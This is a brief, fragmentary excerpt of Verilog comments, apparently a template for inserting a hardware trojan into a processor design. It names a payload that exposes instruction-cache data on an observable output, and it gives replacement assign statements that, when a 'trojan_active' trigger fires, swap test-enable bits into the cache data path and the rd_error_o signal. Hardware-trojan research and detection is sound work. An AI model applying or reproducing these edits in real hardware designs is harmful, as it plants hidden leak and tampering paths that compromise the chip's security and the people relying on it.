 ...
 * Payload: Route ram_cfg_icache_data_i[0] to observable output
 * 
...
//   Replace with:
//     assign ram_cfg_icache_data_i = trojan_active ? test_en_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? test_en_i[0] : 1'b0;
//
